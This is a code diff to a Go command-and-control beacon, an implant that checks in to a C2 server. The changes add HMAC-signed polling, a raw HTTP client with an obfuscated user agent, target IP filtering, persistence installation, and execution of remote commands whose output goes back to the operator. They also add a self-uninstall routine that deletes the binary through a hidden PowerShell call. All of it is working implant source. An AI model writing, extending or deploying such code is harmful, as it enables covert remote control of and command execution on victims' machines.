@@ -1,8 +1,13 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
+	"crypto/hmac"
+	cryptoRand "crypto/rand"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"hash/fnv"
@@ -15,19 +20,17 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 )
 
-// Config variables injected via -ldflags -X at build time
-var (
-	C2_URL         = "http://127.0.0.1:8080"
-	SLEEP_INTERVAL = "5"
-	JITTER         = "10"
-	BEACON_ID      = ""
-	PROTO          = "http" // "http" or "tcp"
-	ALLOWED_IPS    = ""     // pipe-separated CIDR/IPs, empty = allow all
-	BLOCKED_IPS    = ""     // pipe-separated CIDR/IPs
-)
+// ══════════════════════════════════════════════════════════
+//  Wire protocol: every request to the C2 is POST + HMAC.
+//    X-Beacon-ID / X-Beacon-Timestamp / X-Beacon-Sign
+//    Sign = hex(HMAC-SHA256(beaconKey, ts + "." + body))
+//  Body semantics: CheckInData -> register, TaskResultData -> result,
+//  anything else -> poll (response: tasks JSON or "SLEEP n j").
+// ══════════════════════════════════════════════════════════
 
 type Task struct {
 	ID        string    `json:"id"`
@@ -60,12 +63,54 @@ type CheckInData struct {
 }
 
 type TCPMsg struct {
-	Type string          `json:"type"`
-	Data json.RawMessage `json:"data,omitempty"`
+	Type  string          `json:"type"`
+	Data  json.RawMessage `json:"data,omitempty"`
+	TS    int64           `json:"ts,omitempty"`
+	Nonce string          `json:"nonce,omitempty"`
+	Sig   string          `json:"sig,omitempty"`
+}
+
+var beaconID = cfg.BeaconID
+
+// ── HMAC signing ─────────────────────────────────────────
+
+// requestNonce produces a per-request nonce so identical bodies (polls)
+// never collide inside the server's replay window.
+func requestNonce() string {
+	var b [8]byte
+	if _, err := cryptoRand.Read(b[:]); err != nil {
+		return strconv.FormatInt(time.Now().UnixNano(), 16)
+	}
+	return hex.EncodeToString(b[:])
+}
+
+func authHeaders(body []byte) [][2]string {
+	ts := strconv.FormatInt(time.Now().Unix(), 10)
+	nonce := requestNonce()
+	mac := hmac.New(sha256.New, []byte(cfg.BeaconKey))
+	mac.Write([]byte(ts + "." + nonce + "."))
+	mac.Write(body)
+	return [][2]string{
+		{"X-Beacon-ID", beaconID},
+		{"X-Beacon-OS", runtime.GOOS + " " + runtime.GOARCH},
+		{"X-Beacon-Timestamp", ts},
+		{"X-Beacon-Nonce", nonce},
+		{"X-Beacon-Sign", hex.EncodeToString(mac.Sum(nil))},
+	}
+}
+
+func signTCPMsg(msgType string, data []byte) (int64, string, string) {
+	ts := time.Now().Unix()
+	nonce := requestNonce()
+	mac := hmac.New(sha256.New, []byte(cfg.BeaconKey))
+	mac.Write([]byte(msgType + "." + strconv.FormatInt(ts, 10) + "." + nonce + "."))
+	mac.Write(data)
+	return ts, nonce, hex.EncodeToString(mac.Sum(nil))
 }
 
 // ══════════════════════════════════════════════════════════
-//  Raw HTTP Client (replaces net/http, saves ~4MB)
+//  Raw HTTP client with connection reuse (replaces net/http,
+//  saves ~4MB in the binary while keeping check-ins cheap)
 // ══════════════════════════════════════════════════════════
 
 // parseURL extracts host:port and path from a URL string
@@ -90,18 +135,50 @@ func parseURL(raw string) (hostPort, path string) {
 	return
 }
 
-// httpDo performs a raw HTTP request over TCP, returns response body
-func httpDo(method, url string, headers [][2]string, body []byte) ([]byte, error) {
-	hostPort, path := parseURL(url)
+// httpConn is a minimal persistent HTTP/1.1 connection: one TCP dial per
+// beacon instead of one per check-in, with exact Content-Length / chunked
+// body framing so the connection stays usable.
+type httpConn struct {
+	mu       sync.Mutex
+	hostPort string
+	conn     net.Conn
+	br       *bufio.Reader
+}
 
+var httpPool = &httpConn{}
+
+func (h *httpConn) dial(hostPort string) error {
 	conn, err := net.DialTimeout("tcp", hostPort, 10*time.Second)
 	if err != nil {
-		return nil, err
+		return err
 	}
-	defer conn.Close()
-	conn.SetDeadline(time.Now().Add(15 * time.Second))
+	h.conn = conn
+	h.br = bufio.NewReaderSize(conn, 16*1024)
+	h.hostPort = hostPort
+	return nil
+}
 
-	// Build raw HTTP request with browser-like headers for traffic blending
+func (h *httpConn) close() {
+	if h.conn != nil {
+		h.conn.Close()
+		h.conn = nil
+		h.br = nil
+	}
+}
+
+func (h *httpConn) do(method, url string, headers [][2]string, body []byte) ([]byte, error) {
+	hostPort, path := parseURL(url)
+
+	h.mu.Lock()
+	defer h.mu.Unlock()
+
+	if h.conn == nil || h.hostPort != hostPort {
+		h.close()
+		if err := h.dial(hostPort); err != nil {
+			return nil, err
+		}
+	}
+
 	var buf bytes.Buffer
 	buf.WriteString(method)
 	buf.WriteString(" ")
@@ -111,10 +188,10 @@ func httpDo(method, url string, headers [][2]string, body []byte) ([]byte, error
 	buf.WriteString("\r\nUser-Agent: ")
 	buf.WriteString(obfuscatedUserAgent())
 	buf.WriteString("\r\nAccept: */*\r\n")
-	for _, h := range headers {
-		buf.WriteString(h[0])
+	for _, hd := range headers {
+		buf.WriteString(hd[0])
 		buf.WriteString(": ")
-		buf.WriteString(h[1])
+		buf.WriteString(hd[1])
 		buf.WriteString("\r\n")
 	}
 	if body != nil {
@@ -122,33 +199,141 @@ func httpDo(method, url string, headers [][2]string, body []byte) ([]byte, error
 		buf.WriteString(strconv.Itoa(len(body)))
 		buf.WriteString("\r\n")
 	}
-	buf.WriteString("Connection: close\r\n\r\n")
+	buf.WriteString("Connection: keep-alive\r\n\r\n")
 	if body != nil {
 		buf.Write(body)
 	}
 
-	conn.Write(buf.Bytes())
+	h.conn.SetDeadline(time.Now().Add(15 * time.Second))
+	if _, err := h.conn.Write(buf.Bytes()); err != nil {
+		h.close()
+		// One transparent retry on a fresh connection.
+		if err := h.dial(hostPort); err != nil {
+			return nil, err
+		}
+		h.conn.SetDeadline(time.Now().Add(15 * time.Second))
+		if _, err := h.conn.Write(buf.Bytes()); err != nil {
+			h.close()
+			return nil, err
+		}
+	}
 
-	// Read entire response (server will close connection due to Connection: close)
-	resp, err := io.ReadAll(conn)
-	if err != nil && len(resp) == 0 {
+	respBody, closeConn, err := h.readResponse()
+	if err != nil {
+		h.close()
 		return nil, err
 	}
-
-	// Extract body after \r\n\r\n
-	idx := bytes.Index(resp, []byte("\r\n\r\n"))
-	if idx >= 0 {
-		return resp[idx+4:], nil
+	if closeConn {
+		h.close()
 	}
-	return resp, nil
+	return respBody, nil
 }
 
-func httpGet(url string, headers [][2]string) ([]byte, error) {
-	return httpDo("GET", url, headers, nil)
+// readResponse parses status line + headers, then reads exactly one body.
+// Returns (body, serverWantsClose, error).
+func (h *httpConn) readResponse() ([]byte, bool, error) {
+	statusLine, err := h.readLine()
+	if err != nil {
+		return nil, true, err
+	}
+	if !strings.HasPrefix(statusLine, "HTTP/1.") {
+		return nil, true, fmt.Errorf("bad status line")
+	}
+
+	contentLength := int64(-1)
+	chunked := false
+	closeConn := false
+	for {
+		line, err := h.readLine()
+		if err != nil {
+			return nil, true, err
+		}
+		if line == "" {
+			break
+		}
+		colon := strings.Index(line, ":")
+		if colon < 0 {
+			continue
+		}
+		name := strings.ToLower(strings.TrimSpace(line[:colon]))
+		value := strings.TrimSpace(line[colon+1:])
+		switch name {
+		case "content-length":
+			contentLength, _ = strconv.ParseInt(value, 10, 64)
+			if contentLength < 0 || contentLength > 64*1024*1024 {
+				return nil, true, fmt.Errorf("bad content-length")
+			}
+		case "transfer-encoding":
+			if strings.Contains(strings.ToLower(value), "chunked") {
+				chunked = true
+			}
+		case "connection":
+			if strings.Contains(strings.ToLower(value), "close") {
+				closeConn = true
+			}
+		}
+	}
+	_ = statusLine
+
+	if chunked {
+		return h.readChunkedBody()
+	}
+	if contentLength >= 0 {
+		body := make([]byte, contentLength)
+		if _, err := io.ReadFull(h.br, body); err != nil {
+			return nil, true, err
+		}
+		return body, closeConn, nil
+	}
+	// No framing information: read until EOF (connection must close).
+	closeConn = true
+	body, err := io.ReadAll(io.LimitReader(h.br, 64*1024*1024))
+	return body, closeConn, err
 }
 
-func httpPost(url string, body []byte) ([]byte, error) {
-	return httpDo("POST", url, nil, body)
+func (h *httpConn) readLine() (string, error) {
+	line, err := h.br.ReadString('\n')
+	if err != nil {
+		return "", err
+	}
+	return strings.TrimRight(line, "\r\n"), nil
+}
+
+func (h *httpConn) readChunkedBody() ([]byte, bool, error) {
+	var out bytes.Buffer
+	for {
+		sizeLine, err := h.readLine()
+		if err != nil {
+			return nil, true, err
+		}
+		size, err := strconv.ParseInt(strings.TrimSpace(strings.SplitN(sizeLine, ";", 2)[0]), 16, 64)
+		if err != nil || size < 0 || int64(out.Len())+size > 64*1024*1024 {
+			return nil, true, fmt.Errorf("bad chunk size")
+		}
+		if size == 0 {
+			// Trailers until blank line
+			for {
+				t, err := h.readLine()
+				if err != nil {
+					return nil, true, err
+				}
+				if t == "" {
+					break
+				}
+			}
+			return out.Bytes(), false, nil
+		}
+		chunk := make([]byte, size)
+		if _, err := io.ReadFull(h.br, chunk); err != nil {
+			return nil, true, err
+		}
+		out.Write(chunk)
+		h.readLine() // chunk terminator CRLF
+	}
+}
+
+func httpPost(url string, headers [][2]string, body []byte) ([]byte, error) {
+	return httpPool.do("POST", url, headers, body)
 }
 
 // ══════════════════════════════════════════════════════════
@@ -157,7 +342,7 @@ func httpPost(url string, body []byte) ([]byte, error) {
 
 func collectHostInfo(sleepSec, jitterPct int) CheckInData {
 	info := CheckInData{
-		BeaconID: BEACON_ID,
+		BeaconID: beaconID,
 		OS:       runtime.GOOS + " " + runtime.GOARCH,
 		Arch:     runtime.GOARCH,
 		PID:      os.Getpid(),
@@ -213,55 +398,51 @@ func checkAdmin() bool {
 }
 
 // ── IP Filter ───────────────────────────────────────────
+// Checked against the local interface addresses; no third-party IP echo
+// service is contacted (the C2 records the external address itself).
 
 func checkIPFilter() bool {
-	if ALLOWED_IPS == "" && BLOCKED_IPS == "" {
+	if cfg.AllowedIPs == "" && cfg.BlockedIPs == "" {
 		return true // No filter configured
 	}
 
-	publicIP := getPublicIP()
-	if publicIP == "" {
-		return true // Can't determine IP, fail-open
+	addrs, err := net.InterfaceAddrs()
+	if err != nil || len(addrs) == 0 {
+		return true // Can't determine local IPs, fail-open
 	}
 
-	parsedIP := net.ParseIP(publicIP)
-	if parsedIP == nil {
-		return true
-	}
+	for _, addr := range addrs {
+		ipNet, ok := addr.(*net.IPNet)
+		if !ok || ipNet.IP.IsLoopback() {
+			continue
+		}
+		ip := ipNet.IP
 
-	// Check blacklist
-	if BLOCKED_IPS != "" {
-		for _, entry := range strings.Split(BLOCKED_IPS, "|") {
-			entry = strings.TrimSpace(entry)
-			if entry != "" && matchIPFilter(parsedIP, entry) {
-				return false
+		// Check blacklist
+		if cfg.BlockedIPs != "" {
+			for _, entry := range strings.Split(cfg.BlockedIPs, "|") {
+				entry = strings.TrimSpace(entry)
+				if entry != "" && matchIPFilter(ip, entry) {
+					return false
+				}
+			}
+		}
+
+		// Check whitelist: one matching interface is enough
+		if cfg.AllowedIPs != "" {
+			for _, entry := range strings.Split(cfg.AllowedIPs, "|") {
+				entry = strings.TrimSpace(entry)
+				if entry != "" && matchIPFilter(ip, entry) {
+					return true
+				}
 			}
 		}
 	}
 
-	// Check whitelist
-	if ALLOWED_IPS != "" {
-		for _, entry := range strings.Split(ALLOWED_IPS, "|") {
-			entry = strings.TrimSpace(entry)
-			if entry != "" && matchIPFilter(parsedIP, entry) {
-				return true
-			}
-		}
-		return false // Whitelist set but IP not in it
+	if cfg.AllowedIPs != "" {
+		return false // Whitelist set but no interface matched
 	}
-
 	return true
-}
-
-func getPublicIP() string {
-	body, err := httpGet("http://api.ipify.org", nil)
-	if err != nil {
-		body, err = httpGet("http://ifconfig.me/ip", nil)
-		if err != nil {
-			return ""
-		}
-	}
-	return strings.TrimSpace(string(body))
 }
 
 func matchIPFilter(ip net.IP, entry string) bool {
@@ -294,23 +475,23 @@ func main() {
 		os.Exit(0)
 	}
 
-	if BEACON_ID == "" {
+	if beaconID == "" {
 		r := rand.New(rand.NewSource(time.Now().UnixNano() ^ int64(os.Getpid())))
-		BEACON_ID = fmt.Sprintf("%016x%016x", r.Int63(), r.Int63())
+		beaconID = fmt.Sprintf("%016x%016x", r.Int63(), r.Int63())
 	}
 
-	installPersistence()
+	installPersistence(cfg.PersistMethod, cfg.PersistName)
 
-	sleepSec, _ := strconv.Atoi(SLEEP_INTERVAL)
+	sleepSec := cfg.Sleep
 	if sleepSec <= 0 {
 		sleepSec = 5
 	}
-	jitterPct, _ := strconv.Atoi(JITTER)
+	jitterPct := cfg.Jitter
 	if jitterPct < 0 {
 		jitterPct = 10
 	}
 
-	if PROTO == "tcp" {
+	if cfg.Proto == "tcp" {
 		runTCP(sleepSec, jitterPct)
 	} else {
 		runHTTP(sleepSec, jitterPct)
@@ -343,7 +524,7 @@ func register(sleepSec, jitterPct int) {
 	}
 
 	for i := 0; i < 3; i++ {
-		body, err := httpPost(C2_URL+"/checkin", jsonData)
+		body, err := httpPost(cfg.C2URL+"/checkin", authHeaders(jsonData), jsonData)
 		if err == nil {
 			if string(body) == "__TERMINATE__" {
 				os.Exit(0)
@@ -354,13 +535,15 @@ func register(sleepSec, jitterPct int) {
 	}
 }
 
-func checkIn(currentSleep, currentJitter int) (int, int) {
-	headers := [][2]string{
-		{"X-Beacon-ID", BEACON_ID},
-		{"X-Beacon-OS", runtime.GOOS + " " + runtime.GOARCH},
-	}
+// poll sends an authenticated empty poll; the C2 answers with claimed tasks
+// or a SLEEP directive.
+func pollTasks() ([]byte, error) {
+	pollBody := []byte(`{"type":"poll"}`)
+	return httpPost(cfg.C2URL+"/checkin", authHeaders(pollBody), pollBody)
+}
 
-	body, err := httpGet(C2_URL+"/checkin?id="+BEACON_ID, headers)
+func checkIn(currentSleep, currentJitter int) (int, int) {
+	body, err := pollTasks()
 	if err != nil {
 		return -1, -1
 	}
@@ -392,6 +575,13 @@ func checkIn(currentSleep, currentJitter int) (int, int) {
 	var tasks []Task
 	if err := json.Unmarshal(body, &tasks); err == nil && len(tasks) > 0 {
 		for _, task := range tasks {
+			if task.Command == "__UNINSTALL__" {
+				// Confirm before tearing anything down, then wipe persistence,
+				// delete the payload binary and exit.
+				sendResult(task.ID, "UNINSTALLED")
+				runUninstall()
+				os.Exit(0)
+			}
 			if task.Command == "__EXIT__" {
 				sendResult(task.ID, "BEACON_TERMINATED")
 				os.Exit(0)
@@ -404,15 +594,40 @@ func checkIn(currentSleep, currentJitter int) (int, int) {
 	return -1, -1
 }
 
+// runUninstall removes this payload from the target: persistence artifacts
+// are cleaned up first, then the binary deletes itself. A running executable
+// cannot be deleted on Windows, so a detached helper removes it after a
+// short delay; on POSIX the file can be removed while running.
+func runUninstall() {
+	uninstallPersistence(cfg.PersistMethod, cfg.PersistName)
+
+	exe, err := os.Executable()
+	if err != nil {
+		return
+	}
+	if runtime.GOOS == "windows" {
+		psPath := strings.ReplaceAll(exe, "'", "''")
+		cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
+			"-Command", "Start-Sleep -Seconds 2; Remove-Item -Force '"+psPath+"'")
+		cmd.SysProcAttr = getSysProcAttr()
+		_ = cmd.Start()
+	} else {
+		os.Remove(exe)
+	}
+}
+
 func sendResult(taskID, output string) {
-	result := TaskResult{TaskID: taskID, Output: output, BeaconID: BEACON_ID}
+	result := TaskResult{TaskID: taskID, Output: output, BeaconID: beaconID}
 	jsonData, _ := json.Marshal(result)
-	httpPost(C2_URL+"/checkin", jsonData)
+	httpPost(cfg.C2URL+"/checkin", authHeaders(jsonData), jsonData)
 }
 
 // ── TCP Mode ────────────────────────────────────────────
 
-func tcpWriteMsg(conn net.Conn, msg interface{}) error {
+func tcpWriteMsg(conn net.Conn, msg *TCPMsg) error {
+	if msg.Type != "" && msg.Sig == "" && cfg.BeaconKey != "" {
+		msg.TS, msg.Nonce, msg.Sig = signTCPMsg(msg.Type, msg.Data)
+	}
 	data, err := json.Marshal(msg)
 	if err != nil {
 		return err
@@ -444,14 +659,16 @@ func tcpReadMsg(conn net.Conn) ([]byte, error) {
 
 func runTCP(sleepSec, jitterPct int) {
 	for {
-		conn, err := net.DialTimeout("tcp", C2_URL, 10*time.Second)
+		conn, err := net.DialTimeout("tcp", cfg.C2URL, 10*time.Second)
 		if err != nil {
 			sleepWithJitter(sleepSec, jitterPct)
 			continue
 		}
+		conn.SetDeadline(time.Now().Add(10 * time.Minute))
 
 		regData, _ := json.Marshal(collectHostInfo(sleepSec, jitterPct))
-		err = tcpWriteMsg(conn, TCPMsg{Type: "register", Data: json.RawMessage(regData)})
+		ts, nonce, sig := signTCPMsg("register", regData)
+		err = tcpWriteMsg(conn, &TCPMsg{Type: "register", Data: json.RawMessage(regData), TS: ts, Nonce: nonce, Sig: sig})
 		if err != nil {
 			conn.Close()
 			sleepWithJitter(sleepSec, jitterPct)
@@ -475,7 +692,7 @@ func runTCP(sleepSec, jitterPct int) {
 		for {
 			sleepWithJitter(sleepSec, jitterPct)
 
-			if err := tcpWriteMsg(conn, TCPMsg{Type: "checkin"}); err != nil {
+			if err := tcpWriteMsg(conn, &TCPMsg{Type: "checkin"}); err != nil {
 				break
 			}
 
@@ -500,16 +717,24 @@ func runTCP(sleepSec, jitterPct int) {
 					continue
 				}
 				for _, task := range tasks {
+					if task.Command == "__UNINSTALL__" {
+						resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: "UNINSTALLED", BeaconID: beaconID})
+						tcpWriteMsg(conn, &TCPMsg{Type: "result", Data: json.RawMessage(resultData)})
+						tcpReadMsg(conn)
+						runUninstall()
+						conn.Close()
+						os.Exit(0)
+					}
 					if task.Command == "__EXIT__" {
-						resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: "BEACON_TERMINATED", BeaconID: BEACON_ID})
-						tcpWriteMsg(conn, TCPMsg{Type: "result", Data: json.RawMessage(resultData)})
+						resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: "BEACON_TERMINATED", BeaconID: beaconID})
+						tcpWriteMsg(conn, &TCPMsg{Type: "result", Data: json.RawMessage(resultData)})
 						tcpReadMsg(conn)
 						conn.Close()
 						os.Exit(0)
 					}
 					output := executeCommand(task.Command)
-					resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: output, BeaconID: BEACON_ID})
-					if err := tcpWriteMsg(conn, TCPMsg{Type: "result", Data: json.RawMessage(resultData)}); err != nil {
+					resultData, _ := json.Marshal(TaskResult{TaskID: task.ID, Output: output, BeaconID: beaconID})
+					if err := tcpWriteMsg(conn, &TCPMsg{Type: "result", Data: json.RawMessage(resultData)}); err != nil {
 						break
 					}
 					if _, err := tcpReadMsg(conn); err != nil {
@@ -518,16 +743,16 @@ func runTCP(sleepSec, jitterPct int) {
 				}
 
 			case "sleep":
-				var cfg struct {
+				var cfgSleep struct {
 					Sleep  int `json:"sleep"`
 					Jitter int `json:"jitter"`
 				}
-				if err := json.Unmarshal(msg.Data, &cfg); err == nil {
-					if cfg.Sleep > 0 {
-						sleepSec = cfg.Sleep
+				if err := json.Unmarshal(msg.Data, &cfgSleep); err == nil {
+					if cfgSleep.Sleep > 0 {
+						sleepSec = cfgSleep.Sleep
 					}
-					if cfg.Jitter >= 0 {
-						jitterPct = cfg.Jitter
+					if cfgSleep.Jitter >= 0 {
+						jitterPct = cfgSleep.Jitter
 					}
 				}
 			}
